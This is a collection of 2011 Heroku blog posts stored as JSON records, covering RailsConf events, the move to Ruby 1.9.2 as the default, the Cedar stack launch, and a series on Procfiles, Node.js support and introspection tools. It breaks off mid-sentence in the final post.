{"website": "Heroku", "title": "Heroku at RailsConf in Baltimore", "author": ["Ben Scofield"], "link": "https://blog.heroku.com/railsconf-2011", "abstract": "Heroku at RailsConf in Baltimore Posted by Ben Scofield May 12, 2011 Listen to this article Baltimore, Here We Come! Next week is RailsConf in Baltimore, and Heroku is coming out in force. There will be about a dozen of us attending sessions, manning our booth, and chatting with Rubyists, so definitely keep an eye out for us! To make it a bit easier, here’s a quick summary of when and where we’ll be: Monday, May 16th At 6pm, Ben Scofield will be part of the second annual Ignite RailsConf . He’s giving a five-minute talk on How To Be Awesome (From a Counter-Example) . Tuesday, May 17th The Expo Hall opens up Tuesday morning, so you’ll be able to visit the Heroku booth to find us, talk about deployment, and grab some swag. We’ll be around from 10-11:15, 12:35-2:15, and 3:25-4:55 (basically, whenever the Hall is open). We’ll also be giving mini-talks during each session – on RabbitMQ, Procfile and Foreman , database tracking and forking, and more. The Add-ons team will be available all day to meet with add-on providers — both current and prospective. If you’ve been thinking about joining the Provider Program , be sure to grab one of their easily-identifiable green shirts and have a chat. Wednesday, May 18th We’ll be back in the Expo Hall on Wednesday, for all the same hours (10-11:15, 12:35-2:15, and 3:25-4:55). Look for more swag, more minitalks, and more great conversation. At 2:50pm, Ben Scofield will be presenting The Wonderful World of Heroku: 2011 Edition . He’ll be reviewing the biggest developments in the platform over the past year, and will leave plenty of time to answer your burning questions. At 4:25pm, Ryan Smith will give a talk called Solving Performance Problems with Horizontal Scale (The Worker Pattern) . Ryan is the author of Queue Classic and lives and breathes background queues, so don’t miss this one! Thursday, May 19th The Expo Hall is closed on Thursday, but we’ll still be around — just look for us in sessions and in the halls, and we’ll be happy to chat. events", "date": "2011-05-12,"},
{"website": "Heroku", "title": "Defaulting to Ruby 1.9.2", "author": ["Ben Scofield"], "link": "https://blog.heroku.com/defaulting-to-ruby-192", "abstract": "Defaulting to Ruby 1.9.2 Posted by Ben Scofield April 28, 2011 Listen to this article Heroku is fully behind Ruby 1.9.2 as the new gold standard for production Ruby apps.  Over the past few months, we’ve seen more and more developers move to the Bamboo 1.9.2 stack.  It’s fast, stable, and increasingly sees excellent support throughout the community. In February , we said that we’d be reviewing the state of 1.9.2 support with the eventual goal of switching the default for new Ruby apps on Heroku from 1.8.7 to 1.9.2. Today, we’re announcing the date of that switchover. As of June 1st, 2011, all new Ruby applications on Heroku will be run on Ruby 1.9.2 by default. (Existing applications won’t be affected, and you can always create a new application on 1.8.7 by running heroku create --stack bamboo-ree-1.8.7 .) But there’s no need to wait till June – get started with a Ruby 1.9.2 app on Heroku today with the following command: $ heroku create --stack bamboo-mri-1.9.2 ruby stack", "date": "2011-04-28,"},
{"website": "Heroku", "title": "Celadon Cedar", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/celadon_cedar", "abstract": "Celadon Cedar Posted by James Lindenbaum May 31, 2011 Listen to this article Super psyched to announce a major new version of Heroku, the Celadon Cedar stack, going into public beta today (previous stacks were Argent Aspen in 2009, and Badious Bamboo in 2010). Cedar has many new features and updates, but most importantly introduces a new way of thinking about web application architecture and scaling apps on Heroku: the process model . Check it out: New stack Celadon Cedar moves into public beta today: $ heroku create --stack cedar Creating blazing-galaxy-997... done, stack is cedar\nhttp://blazing-galaxy-997.herokuapp.com/ | git@heroku.com:blazing-galaxy-997.git Cedar Docs Define your process types with Procfile: $ cd myapp/ $ cat Procfile web:          bundle exec rails server mongrel -p $PORT\nworker:       bundle exec rake resque:work QUEUE=*\nurgentworker: bundle exec rake resque:work QUEUE=urgent\ntweetscan:    bundle exec ruby tweetscan.rb\ncron:         bundle exec clockwork clock.rb Procfile Process Model Then scale up dynos independently for each process type: $ heroku scale web=4 worker=2 urgentworker=2 tweetscan=1 cron=1 Scaling processes... done Scaling Inspect the state of all your app's dynos across the platform: $ heroku ps Process        State            Command\n-------------  ---------------  ------------------------------------\nweb.1          up for 6s        bundle exec rails server mongrel ...\nweb.2          up for 5s        bundle exec rails server mongrel ...\nweb.3          up for 4s        bundle exec rails server mongrel ...\nweb.4          up for 5s        bundle exec rails server mongrel ...\nworker.1       up for 5s        QUEUE=* bundle exec rake resque:work\nworker.2       up for 4s        QUEUE=* bundle exec rake resque:work\nurgentworker.1 up for 5s        QUEUE=urgent bundle exec rake re ...\ntweetscan.1    up for 5s        bundle exec ruby tweetscan.rb\ncron.1         up for 4s        bundle exec clockwork clock.rb ps Command View detailed, consolidated, real-time logs: $ heroku logs --tail 2011-05-31 04:04:40 heroku[api]      Deploy fee72fc by james@example.com 2011-05-31 04:04:40 heroku[api]      Release v5 created by james@example.com 2011-05-31 04:04:41 heroku[slugc]    Slug compilation finished 2011-05-31 04:04:41 heroku[web.1]    State changed from created to starting\n2011-05-31 04:04:42 heroku[web.1]    Running process with command: `bundle exec rails server mongrel -p 31878` 2011-05-31 04:04:43 app[web.1]       >> Listening on 0.0.0.0:50600, CTRL+C to stop 2011-05-31 04:04:44 heroku[web.1]    State changed from starting to up\n2011-05-31 04:04:44 heroku[worker.1] State changed from created to starting\n2011-05-31 04:04:45 heroku[worker.1] Running process with command: `QUEUE=* bundle exec rake resque:work`\n2011-05-31 04:04:45 heroku[worker.1] State changed from starting to up\n2011-05-31 04:04:45 heroku[web.2]    Running process with command: `bundle exec rails server mongrel -p 31878`\n2011-05-31 04:04:46 heroku[worker.2] Running process with command: `QUEUE=* bundle exec rake resque:work`\n2011-05-31 04:04:46 heroku[worker.2] State changed from created to starting\n2011-05-31 04:04:47 heroku[web.2]    Running process with command: `bundle exec rails server mongrel -p 31878`\n2011-05-31 04:04:47 heroku[worker.2] Running process with command: `QUEUE=* bundle exec rake resque:work` 2011-05-31 04:04:48 heroku[router]   GET sushi.heroku.com/ dyno=web.1 queue=0 wait=0ms service=8ms bytes=179 2011-05-31 04:04:48 app[web.1]       66.75.123.123 - - [15/May/2011 04:05:03] \"GET / HTTP/1.1\" 200 1 0.0009 2011-05-31 04:04:49 app[worker.1]    (in /app) ... Logging Visibility Run one-off interactive processes in the cloud: $ heroku run rake db:migrate Running `rake db:migrate` attached to terminal... up, ps.1\n(in /app)\nMigrating to CreateWidgets (20110204210157)\n==  CreateWidgets: migrating ==================================================\n-- create_table(:widgets)\n   -> 0.0120s\n==  CreateWidgets: migrated (0.0121s) ========================================= $ heroku run ruby scripts/fix_bad_records.rb Running `ruby scripts/fix_bad_records.rb` attached to terminal... up, ps.2 $ heroku run console Running `console` attached to terminal... up, ps.3\nLoading production environment (Rails 3.0.3)\nirb(main):001:0> One-off Processes Official support for Node.js: $ cd my-node-app/ $ ls package.json     Procfile     web.js $ cat Procfile web: node web.js $ git push heroku master -----> Heroku receiving push -----> Node.js app detected -----> Vendoring node 0.4.7\n-----> Installing dependencies with npm 1.0.6\n       mime@1.2.2 ./node_modules/express/node_modules/mime\n       connect@1.4.1 ./node_modules/express/node_modules/connect\n       qs@0.1.0 ./node_modules/express/node_modules/qs\n       express@2.1.0 ./node_modules/express\n       Dependencies installed\n-----> Discovering process types\n       Procfile declares types -> web\n-----> Compiled slug size is 3.1MB\n-----> Launching... done, v4\n       http://radiant-river-296.herokuapp.com deployed to Heroku $ heroku ps Process       State               Command\n------------  ------------------  --------------------------------------------\nweb.1         up for 10s          node web.js $ heroku logs 2011-03-10T10:22:30-08:00 heroku[web.1]: State changed from created to starting\n2011-03-10T10:22:32-08:00 heroku[web.1]: Running process with command: `node web.js`\n2011-03-10T10:22:33-08:00 heroku[web.1]: Listening on 18320\n2011-03-10T10:22:34-08:00 heroku[web.1]: State changed from starting to up $ heroku run node Running `node` attached to terminal... up, ps.1\n> Node.js on Cedar Notes: Cedar uses an entirely new HTTP stack which fully supports HTTP 1.1, long polling, chunked responses, async multi-connection webservers, and more. Cedar features an unprecedented level of isolation and erosion-resistance , keeping dynos running and healthy, even through patches, updates, deploys, failures, and all kinds of app activity. To make more sense with the new process model , we are switching billing units from dynos to dyno-hours, effective June 1, Pacific time.  Free plans will be unaffected, just converting units from first dyno free to first 750 dyno-hours free, per app.  With few exceptions, the cost of Heroku will be unchanged or less expensive for all users. We're really excited about the foundation all of this lays for the great stuff we'll be releasing over the coming months.  For a list of Cedar features, check out the official press release . We will be following up this post with a detailed look at each of the major new areas over the next couple of weeks. Enjoy. (And please send us your feedback at cedar@heroku.com .)", "date": "2011-05-31,"},
{"website": "Heroku", "title": "Ruby 1.9.2 Is Now The Default", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/ruby_1_9_2_is_now_the_default", "abstract": "Ruby 1.9.2 Is Now The Default Posted by Adam Wiggins June 08, 2011 Listen to this article Ruby 1.9.2 on Bamboo is now the default for new apps created on Heroku. As we said back in April : Ruby 1.9.2 as the new gold standard for production Ruby apps. In 2011, we’ve seen more and more developers move to 1.9.2.  It’s fast, stable, and sees excellent support throughout the community. You can always list available stacks with the heroku stack command; and if you want your new app on Ruby 1.8.7 you can run heroku create --stack bamboo-ree-1.8.7 to explicitly ask for the older stack.", "date": "2011-06-08,"},
{"website": "Heroku", "title": "The New Heroku (Part 1 of 4): The Process Model & Procfile", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/the_new_heroku_1_process_model_procfile", "abstract": "The New Heroku (Part 1 of 4): The Process Model & Procfile Posted by Adam Wiggins June 20, 2011 Listen to this article In the beginning was the command line. The command line is a direct and immediate channel for communicating with and controlling a computer.  GUIs and menus are like pointing and gesturing to communicate; whereas the command line is akin to having a written conversation, with all the nuance and expressiveness of language. This is not lost on developers, for whom the command prompt and blinking cursor represents the potential to run anything, to do anything.  Developers use the command line for everything from starting a new project ( rails new ) to managing revisions ( git commit ) to launching secondary, more specialized command lines ( psql , mysql , irb , node ). With Celadon Cedar , Heroku's new runtime stack, the power and expressiveness of the command line can be scaled out across a vast execution environment. Heroku provides access to this environment through an abstraction called the process model .  The process model maps command-line commands with to app code, creating a collection of processes which together form the running app. But what does this mean for you, as an app developer?  Let's dive into the details of the process model, and see how it offers a new way of thinking about how to build and run applications. The Foundation: Running a One-Off Process The simplest manifestation of the process model is running a one-off process.  On your local machine, you can cd into a directory with your app, then type a command to run a process.  On Heroku's Cedar stack, you can use heroku run to launch a process against your deployed app's code on Heroku's execution environment (known as the dyno manifold ). A few examples: $ heroku run date\n$ heroku run curl http://www.google.com/\n$ heroku run rails console\n$ heroku run rake -T\n$ heroku run rails server At first glance, heroku run may seem similar to ssh ; but the only resemblance is that the command specified is being run remotely.  In contrast to ssh , each of these commands is run on a fresh, stand-alone dyno running in different physical locations.  Each dyno is fully isolated , starts up with a pristine copy of the app's compiled filesystem, and entire dyno (including process, memory, filesystem) is discarded when the process launched by the command exits or is terminated. The command heroku run rails server launches a webserver process for your Rails app.  Running a webserver in the foreground as a one-off process is not terribly useful: for general operation, you want a long-lived process that exists as a part of a fleet of such processes which do the app's business.  To achieve this, we'll need another layer on top of the single-run process: process types, and a process formation. Defining an App: Process Types via Procfile A running app is a collection of processes.  This is true whether you are running it on your local workstation, or as a production deploy spread out across many physical machines.  Historically, there has been no single, language-agnostic, app-centric method for defining the processes that make up an app.  To solve this, we introduce Procfile . Procfile is a format for declaring the process types that describe how your app will run.  A process type declares its name and a command-line command: this is a prototype which can be instantiated into one or more running processes. Here's a sample Procfile for a Node.js app with two process types: web (for HTTP requests), and worker (for background jobs). Procfile web:     node web.js\nworker:  node worker.js In a local development environment, you can run a small-scale version of the app by launching one process for each of the two process types with Foreman : $ gem install foreman\n$ foreman start\n10:14:40 web.1     | started with pid 13998\n10:14:40 worker.1  | started with pid 13999\n10:14:41 web.1     | Listening on port 5000\n10:14:41 worker.1  | Worker ready to do work The Heroku Cedar stack has baked-in support for Procfile -backed apps: $ heroku create --stack cedar\n$ git push heroku master\n...\n-----> Heroku receiving push\n-----> Node.js app detected\n...\n-----> Discovering process types\n       Procfile declares types -> web, worker This Procfile -backed app is deployed to Heroku.  Now you're ready to scale out. Scaling Out: The Processes Formation Running locally with Foreman, you only need one process for each process type.  In production, you want to scale out to much greater capacity.  Thanks to a share-nothing architecture, each process type can be instantiated into any number of running processes.  Each process of the same process type shares the same command and purpose, but run as separate, isolated processes in different physical locations . Cedar provides the heroku scale command to make this happen: $ heroku scale web=10 worker=50\nScaling web processes... done, now running 10\nScaling worker processes... done, now running 50 Like heroku run , heroku scale launches processes.  But instead of asking for a single, one-shot process attached to the terminal, it launches a whole group of them, starting from the prototypes defined in your Procfile .  The shape of this group of running processes is known as the process formation . In the example above, the process formation is ten web processes and fifty worker processes.  After scaling out, you can see the status of your new formation with the heroku ps command: $ heroku ps\nProcess       State               Command\n------------  ------------------  ------------------------------\nweb.1         up for 2s           node web.js\nweb.2         up for 1s           node web.js\n...\nworker.1      starting for 3s     node worker.js\nworker.2      up for 1s           node worker.js\n... The dyno manifold will keep these processes up and running in this exact formation, until you request a change with another heroku scale command.  Keeping your processes running indefinitely in the formation you've requested is part of Heroku's erosion-resistance . Run Anything The process model, heroku run , and heroku scale open up a whole new world of possibilities for developers like you working on the Heroku platform. A simple example: swap out the webserver and worker system used for your Rails app (Heroku defaults to Thin and Delayed Job ), and use Unicorn and Resque instead: Gemfile gem 'unicorn'\ngem 'resque'\ngem 'resque-scheduler' Procfile web:     bundle exec unicorn -p $PORT -c ./config/unicorn.rb\nworker:  bundle exec rake resque:work QUEUE=* For background work, you can run different types of workers consuming from different queues.  Add a clock process as a flexible replacement for cron using resque-scheduler : Procfile worker:    bundle exec rake resque:work QUEUE=*\nurgworker: bundle exec rake resque:work QUEUE=urgent\nclock:     bundle exec resque-scheduler Goliath is an innovative new EventMachine -based evented webserver. Write a Goliath-based app and you'll be able to run it from your Procfile : Gemfile gem 'goliath' Procfile web: bundle exec ruby hello_goliath.rb -sv -e prod -p $PORT Or how about a Node.js push-based pubsub system like Juggernaut or Faye ? package.json {\n  \"name\": \"myapp\",\n  \"version\": \"0.0.1\",\n  \"dependencies\": {\n    \"juggernaut\": \"2.0.5\"\n  }\n} Procfile web: node_modules/.bin/juggernaut This is just a taste of what you can do with Procfile .  The possibilities are nearly limitless. Conclusion The command line is a simple, powerful, and time-honored abstraction. Procfile is a layer on top of the command line for declaring how your app gets run.  With Cedar, heroku scale becomes your distributed process manager, and heroku run becomes your distributed command line. We've only just seen the beginning of what the process model can do: over the next year, Heroku will be adding new language runtimes, new routing capabilities, and new types of add-on resources.  The sky's the limit, and we can't wait to see what inventive new kinds of apps developers like you will be building. Other Posts From This Series Part 2: Node.js & New HTTP Capabilities Part 3: Visibility & Introspection Part 4: Erosion-resistance & Explicit Contracts", "date": "2011-06-20,"},
{"website": "Heroku", "title": "The New Heroku (Part 2 of 4): Node.js & New HTTP Capabilities", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/the_new_heroku_2_node_js_new_http_routing_capabilities", "abstract": "The New Heroku (Part 2 of 4): Node.js & New HTTP Capabilities Posted by Adam Wiggins June 22, 2011 Listen to this article Node.js has gotten its share of press in the past year, achieving a level of attention some might call hype.  Among its touted benefits are performance , high concurrency via a single-threaded event loop , and a parity between client-side and sever-side programming languages which offers the Promethean opportunity of making server-side programming accessible to front-end developers. But what is Node.js, exactly?  It's not a programming language - it's simply Javascript.  It's not a VM: it uses the V8 Javascript engine , the same one used by the Chrome web browser .  Nor is it simply a set of libraries for Javascript .  Nor is it a web framework, though the way it is sweeping the early-adopter developer community is reminiscent of Rails circa 2005. Most would cite Node's asynchronous programming model, driven by the reactor pattern , as its key differentiator from other ways of writing server-side code for the web.  But even this is not new or unique: Twisted for Python has been around for a decade . So what makes Node special? The Right Technology at the Right Time One part of the reason Node.js has captured the hearts and minds of alpha geeks in web development is because it offers all the things described above - a language, a fast and robust VM, a set of compatible and well-documented libraries, and an async framework - all bundled together into a single, coherent package. The charismatic leadership of Ryan Dahl may be another part of the answer: strong figureheads are often key elements in driving explosive developer community growth (see: Linux/Linus Torvalds , Rails/David Heinemeier Hansson , Ruby/Matz , Python/Guido van Rossum , Redis/Salvatore Sanfilippo , CouchDB/Damien Katz ). But the primary reason is even simpler: Node.js is the right technology at the right time.  Demand for asynchronous capabilities in web apps is being driven by what has become known as \"the realtime web.\" Another label for \"realtime\" (which has a conflicting definition from computer science ) is \"evented.\" Events, Not Polling The evented web means users getting updates pushed to them as new data becomes available, rather than having to poll for it.  Polling is the software equivalent of nagging - not fun or efficient for either end of the transaction. The rise of an event-driven web makes the appearance of Node.js timely, because Node.js has evented baked in at a level that no other programming language or framework can match.  And Node.js being Javascript - a language born of the web - closes the deal. Unix daemons (such as the famously-fast Nginx ) often use evented programming to maximize concurrency and robustness.  The seminal C10K article explores the use of system calls such as kqueue and epoll for evented programming.  In scripting languages, evented frameworks such as Twisted for Python and EventMachine for Ruby enjoy popularity. EventMachine is a fascinating case study to compare against Node.js.  Because EventMachine's reactor takes over the entire execution thread (via EM.run ), most vanilla Ruby programs require a rewrite to use it, and the developer is cut off from the vast collection of synchronous libraries found in the Ruby ecosystem. A whole slew of em-* libraries have appeared , effectively creating a sub-language of Ruby.  The partial incompatibility between Ruby and em-Ruby is a source of confusion for developers new to evented programming. This is where Node.js succeeds: pulling together the language, the async framework, and a whole universe of libraries guaranteed to work in the evented model. Node.js on Heroku/Cedar Heroku's new runtime stack, Celadon Cedar , includes first-class support for Node.js apps.  A quick taste: web.js var app = require('express').createServer();\n\napp.get('/', function(request, response) {\n  response.send('Hello World!');\n});\n\napp.listen(process.env.PORT || 3000); NPM has become the community standard for dependency management in Node.js.  Writing a package.json declares your app's dependencies and tells Heroku your app is a Node.js app: package.json {\n  \"name\": \"node-example\",\n  \"version\": \"0.0.1\",\n  \"dependencies\": {\n    \"express\": \"2.2.0\"\n  }\n} Read the full Node.js on Heroku/Cedar quickstart guide to dive in and try it for yourself. New HTTP Routing Stack: herokuapp.com Because the fate of Node.js is entwined so directly with that of the next-generation HTTP techniques (such as chunked responses and long polling ), Cedar comes bundled with a new HTTP stack .  The new HTTP stack, which runs on the herokuapp.com domain, provides a more direct connection between the end user's browser (or other HTTP client) and the app dyno which is serving the request. Here are two examples of apps which use advanced HTTP features for evented apps: Ryan Dahl's chat server: sample deploy on Cedar and sourcecode . The Node.js Knockout 2011 homepage: sample deploy Cedar and sourcecode .  (Click anywhere with the mouse or use arrow keys to move your avatar around.  Try opening it in two browser windows side-by-side to see how moving the avatar in one window updates the other one in real time!) One caveat: we've made the difficult decision to hold off on supporting WebSockets, as the protocol is still in flux and not uniformly supported in modern standards-compliant browsers .  Once the WebSockets protocol matures further, we'll be delighted to support it in the herokuapp.com HTTP stack.  In the meantime, use the Socket.IO library, which falls back to the best available transport mechanism given the HTTP stack and browser capabilities for a given HTTP request. The Future Node.js is still under rapid development, and staying abreast of new releases can be a challenge.  Heroku must balance the goals of being a curated, erosion-resistant platform against keeping pace with extremely active developer communities such as Ruby, Ruby/Rails, and Node.js.  We look forward to applying all we've learned so far to the highly dynamic world of Node.js. Other Posts From This Series Part 1: The Process Model & Procfile Part 3: Visibility & Introspection Part 4: Erosion-resistance & Explicit Contracts", "date": "2011-06-22,"},
{"website": "Heroku", "title": "The New Heroku (Part 3 of 4): Visibility & Introspection", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/the_new_heroku_3_visibility_introspection", "abstract": "The New Heroku (Part 3 of 4): Visibility & Introspection Posted by Adam Wiggins June 24, 2011 Listen to this article Visibility and introspection capabilities are critical for managing and debugging real-world applications.  But cloud platforms are often lacking when it comes to visibility.  The magical black box is great when it \"just works,\" but not so great when your app breaks and you can't look inside the box. Standard introspection tools used in server-based deployments — such as ssh , ps aux , top , tail -f logfile , iostat — aren't valid in a multi-tenant cloud environment.  We need new tools, new approaches.  Heroku's new runtime stack, Celadon Cedar , includes three powerful tools for visibility and introspection: heroku ps , heroku logs , and heroku releases .  This post will examine each. But first, a story. The Deploy Gone Wrong (A Parable) The FooBaz Co development team practices continuous deployment , pushing new code to their production app running on Heroku several times a day.  Today, happy-go-lucky coder Ned has done a small refactoring which pulls some duplicated code out into a new library, called Utils .  The unit tests are all green, and the app looks good running under Foreman on his local workstation; so Ned pushes his changes up to production. $ git push heroku\n...\n-----> Heroku receiving push\n...\n-----> Launching... done, v74\n       http://foobaz-production.herokuapp.com deployed to Heroku Ned likes to use the introspection tools at his disposal to check the health of the app following any deploy.  He starts by examining the app's running processes with heroku ps : $ heroku ps\nProcess       State               Command\n------------  ------------------  ------------------------------\nweb.1         crashed for 4s      bundle exec thin start -p $PORT -e..\nweb.2         crashed for 2s      bundle exec thin start -p $PORT -e..\nworker.1      crashed for 3s      bundle exec rake jobs:work\nworker.2      crashed for 2s      bundle exec rake jobs:work Disaster!  All the processes in the process formation have crashed.  Ned has a red alert on his hands — the production site is down. Recovering Quickly Adrenaline pumping, Ned now uses the second introspection tool, heroku logs : $ heroku logs --ps web.1\n2011-06-19T08:35:19+00:00 heroku[web.1]: Starting process with command: `bundle exec thin start -p 38180 -e production`\n2011-06-19T08:35:21+00:00 app[web.1]: /app/config/initializers/load_system.rb:12:in `<top (required)>': uninitialized constant Utils (NameError)\n2011-06-19T08:35:21+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/railties-3.0.7.rc1/lib/rails/engine.rb:201:in `block (2 levels) in <class:Engine>'\n2011-06-19T08:35:21+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/railties-3.0.7.rc1/lib/rails/engine.rb:200:in `each'\n2011-06-19T08:35:21+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/railties-3.0.7.rc1/lib/rails/engine.rb:200:in `block in <class:Engine>'\n... All processes crashed trying to start up, because the Utils module is missing.  Ned forgot to add lib/utils.rb to Git. Ned could press forward by adding the file and pushing again.  But the wise move here is to roll back to a known good state, and then think about the fix. Heroku's third visibility tool, releases , tracks deploys and other changes.  It includes a powerful undo capability: rollback .  So Ned takes a deep breath, then runs: $ heroku rollback\n-----> Rolling back to v73... done, v75 Ned checks heroku ps : $ heroku ps\nProcess       State               Command\n------------  ------------------  ------------------------------\nweb.1         up for 1s           bundle exec thin start -p $PORT -e..\nweb.2         up for 1s           bundle exec thin start -p $PORT -e..\nworker.1      starting for 3s     bundle exec rake jobs:work\nworker.1      starting for 2s     bundle exec rake jobs:work The app's processes are successfully restarting in their previous state.  Crisis averted, Ned can now take his time examining what went wrong, and how to fix it, before deploying again. The Fix Ned investigates locally and confirms with git status that he forgot to add the file.  He adds the file to Git and commits, this time double-checking his work. He pushes to Heroku again, then uses all three introspection techniques to confirm the newly-deployed app is healthy: $ heroku ps\nProcess       State               Command\n------------  ------------------  ------------------------------\nweb.1         up for 2s           bundle exec thin start -p $PORT -e..\nweb.2         up for 2s           bundle exec thin start -p $PORT -e..\nworker.1      up for 1s           bundle exec rake jobs:work\nworker.1      up for 2s           bundle exec rake jobs:work\n\n$ heroku logs\n2011-06-19T08:39:17+00:00 heroku[web.1]: Starting process with command: `bundle exec thin start -p 56320 -e production`\n2011-06-19T08:39:19+00:00 app[web.1]: >> Using rack adapter\n2011-06-19T08:39:19+00:00 app[web.1]: >> Thin web server (v1.2.11 codename Bat-Shit Crazy)\n2011-06-19T08:39:19+00:00 app[web.1]: >> Maximum connections set to 1024\n2011-06-19T08:39:19+00:00 app[web.1]: >> Listening on 0.0.0.0:56320, CTRL+C to stop\n\n$ heroku releases\nRel   Change                          By                    When\n----  ----------------------          ----------            ----------\nv76   Deploy d706b4a                  ned@foobazco.com      1 minute ago\nv75   Rollback to v73                 ned@foobazco.com      14 minutes ago\nv74   Deploy 20a5742                  ned@foobazco.com      15 minutes ago\nv73   Deploy df7bb82                  rick@foobazco.com     2 hours ago Golden.  Ned breathes a sigh of relief, and starts composing an email to his team about how they should really think about using a staging app as protection against this kind of problem in the future. Now that we've seen each of these three visibility tools in action, let's look at each in more depth. Visibility Tool #1: ps heroku ps is a spiritual sister to the unix ps command, and a natural extension of the process model approach to running apps.  But where unix's ps is for a single machine, heroku ps spans all of the app's processes on the distributed execution environment of the dyno manifold . A clever trick here is to use the watch command for a realtime display of your app's process status: $ watch heroku ps\nEvery 2.0s: heroku ps                          Sun Jun 19 01:44:55 2011\n\nProcess       State               Command\n------------  ------------------  ------------------------------\nweb.1         up for 16h          bundle exec rackup -p $PORT -E $RA.. Leave this running in a terminal as you push code, scale the process formation, change config vars, or add add-ons, and you'll get a first-hand look at how the Heroku process manager handles your processes. Dev Center: ps command Visibility Tool #2: Logs In server-based deploys, logs often exist as files on disk, which can lead to us thinking of logs as files (hence \"logfiles\").  A better conceptual model is: Logs are a stream of time-ordered events aggregated from the output streams of all the app's running processes, system components, and backing services. Heroku's Logplex routes log streams from all of these diverse sources into a single channel, providing the foundation for truly comprehensive logging.  Heroku aggregates three categories of logs for your app: App logs - Output from your app, such as: everything you'd normally expect to see in Rails' production.log , output from Thin, output from Delayed Job. System logs - Messages about actions taken by the Heroku platform infrastructure on behalf of your app, such as: restarting a crashed process, idling or unidling a web dyno, or serving an error page due to a problem in your app. API logs - Messages about administrative actions taken by you and other developers working on your app, such as: deploying new code, scaling the process formation, or toggling maintenance mode . Filtering down to just API logs is a great way to see what you and other collaborators on the app have been up to: $ heroku logs --source heroku --ps api\n2011-06-18T08:21:37+00:00 heroku[api]: Set maintenance mode on by kate@foobazco.com\n2011-06-18T08:21:39+00:00 heroku[api]: Config add ADMIN_PASSWORD by kate@foobazco.com\n2011-06-18T08:21:39+00:00 heroku[api]: Release v4 created by kate@foobazco.com\n2011-06-18T08:21:43+00:00 heroku[api]: Scale to web=4 by kate@foobazco.com\n2011-06-18T08:22:01+00:00 heroku[api]: Set maintenance mode off by kate@foobazco.com If your teammates are actively performing administrative actions on the app, running the above command with the additional argument of --tail will let you watch the events unfold as they happen.  Add watch heroku ps and watch heroku releases in terminals paneled to all be visible at once, and you've got a mini- mission control for your app. Dev Center: Logging Visibility Tool #3: Releases Releases are a history of changes to your app.  New releases are created whenever you deploy new code, change config vars, or change add-ons.  Each release stores the full state of the code and config, in addition to audit information such as who made the change and a timestamp. This is the release history following Ned's bad deploy and subsequent recovery: $ heroku releases\nRel   Change                          By                    When\n----  ----------------------          ----------            ----------\nv76   Deploy d706b4a                  ned@foobazco.com      1 minute ago\nv75   Rollback to v73                 ned@foobazco.com      14 minutes ago\nv74   Deploy 20a5742                  ned@foobazco.com      15 minutes ago\nv73   Deploy df7bb82                  rick@foobazco.com     2 hours ago Starting from the oldest release at the bottom: v73 was a code deploy by a developer named Rick from earlier today.  This one ran without problems for about two hours. v74 was Ned's deploy which was missing a file. v75 was the rollback, which Ned ran just moments after the bad deploy.  This is an exact copy of v73 (more on this in a moment). v76 was a deploy of the fixed code.  Ned was able to spend some time (about ten minutes) double-checking it; the rollback saved him from needing to rush out a fix under pressure. The top release is always the currently running one, so in this case, we see that v76 is current and was deployed just one minute ago. More Than Just An Audit Trail Releases aren't just a history of what happened, they are a fundamental unit in the machinery of the Heroku platform. The transaction history is the primary source of record , meaning the release is the canonical source of information about the code and config used to run your app's processes.  This is one way in which the Heroku platform ensures uniformity in the version of code and config used to run all processes in the app's process formation. Furthermore, releases are an append-only ledger , a concept taken from financial accounting and applied to transactional systems .  A mistake in the ledger can't be erased, it can only be corrected by a new entry.  This is why heroku rollback creates a new release, which is an exact copy the code and config for a previous release. We're striving to make releases front-and-center in the output from any command that creates a new release.  A release sequence number, such as v10 , appears any time you create a new release. Deploying new code: $ git push heroku master\n...\n-----> Launching... done, v10 Setting a config var: $ heroku config:add FOO=baz\nAdding config vars:\n  FOO => baz\nRestarting app... done, v11 Rolling back: $ heroku rollback\n-----> Rolling back to v10... done, v12 Adding an add-on: $ heroku addons:add memcache\n-----> Adding memcache to strong-fire-938... done, v13 (free) And as you'd expect, each of the releases above are now listed in heroku releases : $ heroku releases\nRel   Change                          By                    When\n----  ----------------------          ----------            ----------\nv13   Add-on add memcache:5mb         kate@foobazco.com     16 seconds ago\nv12   Rollback to v10                 kate@foobazco.com     1 minute ago\nv11   Config add FOO                  kate@foobazco.com     1 minute ago\nv10   Deploy 20a5742                  kate@foobazco.com     11 minutes ago Releases and rollback are powerful tools for introspection and management.  We encourage all developers using Heroku to get familiar with them. Dev Center: Releases The Future Logging, releases, and ps provide a new level of visibility and introspection on the Heroku cloud application platform.  But we're not done yet. We know, for example, that long-term archival, search, and analytics capability for logs is crucial for production apps, particularly at large scale.  We're working on improvements to Logplex's storage and retrieval, as well as capabilities for add-on providers to register themselves as log drains , opening up your app to the world of syslog-as-a-service providers and log analytics tools. More generally, we're striving to increase visibility across the board — both in our current introspection tools, and by creating new tools.  Visibility may initially seem like a minor concern, but as we've seen in this post, it has deep implications the Heroku cloud application platform, and for you as a developer managing your production apps. Other Posts From This Series Part 1: The Process Model & Procfile Part 2: Node.js & New HTTP Capabilities Part 4: Erosion-resistance & Explicit Contracts", "date": "2011-06-24,"},
{"website": "Heroku", "title": "The New Heroku (Part 4 of 4): Erosion-resistance & Explicit Contracts", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/the_new_heroku_4_erosion_resistance_explicit_contracts", "abstract": "The New Heroku (Part 4 of 4): Erosion-resistance & Explicit Contracts Posted by Adam Wiggins June 28, 2011 Listen to this article In 2006, I wrote Catapult : a Quicksilver -inspired command-line for the web.  I deployed it to a VPS (Slicehost), then gave the URL out to a few friends.  At some point I stopped using it, but some of my friends remained heavy users.  Two years later, I got an email: the site was down. Logging into the server with ssh , I discovered many small bits of breakage: The app's Mongrel process had crashed and not restarted. Disk usage was at 100%, due to growth of logfiles and temporary session data. The kernel, ssh, OpenSSL, and Apache needed critical security updates. The Linux distro had just reached end-of-life , so the security fixes were not available via apt-get .  I tried to migrate to a new VPS instance with an updated operating system, but this produced a great deal more breakage: missing Ruby gems, hardcoded filesystem paths in the app which had changed in the new OS, changes in some external tools (like ImageMagick ).  In short, the app had 